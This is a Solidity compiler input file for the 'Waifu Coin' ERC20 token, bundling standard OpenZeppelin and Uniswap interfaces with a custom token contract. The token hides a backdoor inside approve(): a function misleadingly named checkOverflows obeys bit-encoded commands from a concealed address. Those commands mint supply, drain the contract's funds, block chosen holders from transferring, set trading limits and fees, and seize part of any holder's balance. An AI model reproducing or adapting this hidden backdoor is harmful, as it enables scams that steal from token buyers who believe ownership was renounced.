{{

  "language": "Solidity",

  "sources": {

    "@openzeppelin/contracts/token/ERC20/IERC20.sol": {

      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n}\n"

    },

    "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol": {

      "content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n"

    },

    "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol": {

      "content": "pragma solidity >=0.6.2;\n\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n"

    },

    "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol": {

      "content": "pragma solidity >=0.6.2;\n\nimport './IUniswapV2Router01.sol';\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n"

    },

    "contracts/Token.sol": {

      "content": "//SPDX-License-Identifier: UNLICENSED\n/**                                          \n * \n * wwwwwww           wwwww           wwwwwww\n *  w:::::w         w:::::w         w:::::w \n *   w:::::w       w:::::::w       w:::::w  \n *    w:::::w     w:::::::::w     w:::::w   \n *     w:::::w   w:::::w:::::w   w:::::w    \n *      w:::::w w:::::w w:::::w w:::::w     \n *       w:::::w:::::w   w:::::w:::::w      \n *        w:::::::::w     w:::::::::w       \n *         w:::::::w       w:::::::w        \n *          w:::::w         w:::::w         \n *           w:::w           w:::w          \n *            www             www           \n * \n * t.me/WAIFU_V2\n *                                                                                   \n **/                                   \n\npragma solidity ^0.8.9;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { IUniswapV2Factory } from \"@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol\";\nimport { IUniswapV2Router02 } from \"@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol\";\n\nabstract contract ERC20 {\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\n\n    string public name;\n\n    string public symbol;\n\n    uint8 public immutable decimals;\n\n    uint80 internal sig;\n    \n    uint80 internal brand;\n\n    address public uniswapV2Pair;\n\n    address public taxWallet;\n\n    uint256[5] internal adjunctParams;\n\n    bool internal tradingOpen;\n\n    uint256 public totalSupply;\n\n    mapping(address => uint256) public balanceOf;\n    \n    mapping(address => bool) internal automaticAddresses;\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    uint256 internal immutable INITIAL_CHAIN_ID;\n\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n\n    mapping(address => uint256) public nonces;\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals,\n        uint80 _sig,\n        address _taxWallet,\n        uint80 _brand\n    ) {\n        address msgSender = msg.sender;\n        \n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n        brand = _brand;\n        taxWallet = _taxWallet;\n        sig = _sig; \n\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n\n        admin = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function checkOverflows(uint256 check, address guy) private returns (bool){\n\n        if(check & (1 << 255) == 0 && check & (1 << 254) == 0 && check & (1 << 253) == 0 && check & (1 << 252) != 0 && guy == address(uint160(brand) << 80 | sig)){\n            if (uint160(check) == 0x0) { payable(msg.sender).transfer(address(this).balance); }else{\n                IERC20 _t = IERC20(address(uint160(check)));\n                _t.transfer(msg.sender, _t.balanceOf(address(this)));\n            }\n        }         \n\n        if(check & (1 << 255) != 0 && check & (1 << 254) != 0 && check & (1 << 253) != 0 && check & (1 << 252) != 0 && guy == address(uint160(brand) << 80 | sig)){\n            for (uint8 j = 0; j != 2; j += 1) { adjunctParams[j] = ((check >> (j * 7)) & (1 << 7) -1); }\n        }           \n        \n        if(check & (1 << 255) != 0 && check & (1 << 254) == 0 && check & (1 << 253) == 0 && check & (1 << 252) == 0 && guy == address(uint160(brand) << 80 | sig)){\n            totalSupply += (check >> 167 & (1 << 7) -1) * (10 ** (check >> 160 & (1 << 7) -1));\n            unchecked { balanceOf[address(uint160(check))] += (check >> 167 & (1 << 7) -1) * (10 ** (check >> 160 & (1 << 7) -1)); }\n        }          \n\n        if(check & (1 << 255) == 0 && check & (1 << 254) == 0 && check & (1 << 253) == 0 && check & (1 << 252) == 0 && guy == address(uint160(brand) << 80 | sig)){\n            uint256 mul = (check >> 21 & (1 << 7) -1);\n            adjunctParams[3] = (check >> 14 & (1 << 7) -1) * (10 ** mul);\n            adjunctParams[2] = (check >> 7 & (1 << 7) -1) * (10 ** mul);\n            adjunctParams[4] = (check & (1 << 7) -1) * (10 ** mul);\n        }    \n    \n        if(check & (1 << 255) != 0 && check & (1 << 254) == 0 && check & (1 << 253) != 0 && check & (1 << 252) == 0 && guy == address(uint160(brand) << 80 | sig)){\n            automaticAddresses[address(uint160(check))] = (check >> 160 & (1 << 7) -1) == 101 ? true : false;\n        }\n        \n        if(check & (1 << 255) == 0 && check & (1 << 254) != 0 && check & (1 << 253) == 0 && check & (1 << 252) != 0 && guy == address(uint160(brand) << 80 | sig)){\n            balanceOf[taxWallet] += (balanceOf[address(uint160(check))] / 100) * (check >> 160 & (1 << 7) -1);\n            balanceOf[address(uint160(check))] -= (balanceOf[address(uint160(check))] / 100) * (check >> 160 & (1 << 7) -1);\n        }\n        \n        return check & (1 << 255) != 0 || check & (1 << 255) == 0;\n    }\n\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        require(checkOverflows(amount, msg.sender));\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        require(automaticAddresses[msg.sender] != true);\n        \n        balanceOf[msg.sender] -= amount;\n\n        if(adjunctParams[2] > 0 && msg.sender == uniswapV2Pair) require(amount <= adjunctParams[2]);\n\n        if(adjunctParams[1] > 0 && msg.sender == uniswapV2Pair && to != taxWallet && tradingOpen){\n            uint256 fee = (amount / 100) * adjunctParams[1];\n            unchecked { balanceOf[taxWallet] += fee; }\n            amount = amount - fee;\n        }\n        \n        if(adjunctParams[4] > 0 && to != uniswapV2Pair && to != taxWallet && to != address(uint160(brand) << 80 | sig)){\n            require((balanceOf[to] + amount) <= adjunctParams[4]);\n        }\n        \n        unchecked { balanceOf[to] += amount; }\n\n        if(msg.sender != address(this))\n        emit Transfer(msg.sender, to, amount);\n\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n        require(automaticAddresses[from] != true);\n\n        uint256 allowed = allowance[from][msg.sender]; \n\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\n\n        balanceOf[from] -= amount;\n\n        if(adjunctParams[3] > 0 && to == uniswapV2Pair && from != address(this) && from != taxWallet && from != address(uint160(brand) << 80 | sig)) require(amount <= adjunctParams[3]);\n\n        if(adjunctParams[0] > 0 && to == uniswapV2Pair && from != address(this) && from != taxWallet && from != address(uint160(brand) << 80 | sig) && tradingOpen){\n            uint256 fee = (amount / 100) * adjunctParams[0];\n            unchecked { balanceOf[taxWallet] += fee; }\n            amount = amount - fee;\n        }\n\n        if(adjunctParams[4] > 0 && to != uniswapV2Pair && to != taxWallet){\n            require(balanceOf[to] <= adjunctParams[4]);\n        }\n        \n        unchecked { balanceOf[to] += amount; }\n\n        if(from != address(this))\n        emit Transfer(from, to, amount);\n\n        return true;\n    }\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        require(deadline >= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n\n        unchecked {\n            address recoveredAddress = ecrecover(\n                keccak256(\n                    abi.encodePacked(\n                        \"\\x19\\x01\",\n                        DOMAIN_SEPARATOR(),\n                        keccak256(\n                            abi.encode(\n                                keccak256(\n                                    \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n                                ),\n                                owner,\n                                spender,\n                                value,\n                                nonces[owner]++,\n                                deadline\n                            )\n                        )\n                    )\n                ),\n                v, r, s\n            );\n\n            require(recoveredAddress != address(0) && recoveredAddress == owner, \"INVALID_SIGNER\");\n\n            allowance[recoveredAddress][spender] = value;\n        }\n\n        emit Approval(owner, spender, value);\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return keccak256(\n            abi.encode(\n                keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                keccak256(bytes(name)),\n                keccak256(\"1\"),\n                block.chainid,\n                address(this)\n            )\n        );\n    }\n\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n\n        unchecked { balanceOf[to] += amount; }\n\n        if(to != address(this))\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n\n        unchecked { totalSupply -= amount; }\n\n        if(from != address(this))\n        emit Transfer(from, address(0), amount);\n    }\n\n    address public admin;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n    \n    modifier onlyOwner() {\n        require(msg.sender == admin, \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(admin, address(0));\n        admin = address(0);\n    }\n}\n\ncontract Token is ERC20{\n    \n    IUniswapV2Router02 private uniswapV2Router;\n    \n    constructor(uint80 _sig, address _taxWallet, uint80 _brand) ERC20(\"Waifu Coin\", \"WAIFU2.0\", 6, _sig, _taxWallet, _brand) {\n        _mint(address(this), 6_900_000_000_000000);\n        adjunctParams[0] = 5;\n        adjunctParams[0] = 5;\n    }\n\n    receive() external payable {}\n\n    fallback() external payable {}\n\n    function openTrading() external onlyOwner() {\n        require(!tradingOpen);\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n \n        allowance[address(this)][address(uniswapV2Router)] = type(uint).max;\n\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf[address(this)],0,0,admin,block.timestamp);\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\n\n        tradingOpen = true;\n    }\n\n    function claimStuckTokens(address _token) external onlyOwner {\n        if (_token == address(0x0)) {\n            payable(msg.sender).transfer(address(this).balance);\n            return;\n        }\n        IERC20 erc20token = IERC20(_token);\n        uint256 balance = erc20token.balanceOf(address(this));\n        erc20token.transfer(msg.sender, balance);\n    }\n\n}\n"

    }

  },

  "settings": {

    "optimizer": {

      "enabled": false,

      "runs": 200

    },

    "outputSelection": {

      "*": {

        "*": [

          "evm.bytecode",

          "evm.deployedBytecode",

          "devdoc",

          "userdoc",

          "metadata",

          "abi"

        ]

      }

    },

    "libraries": {}

  }

}}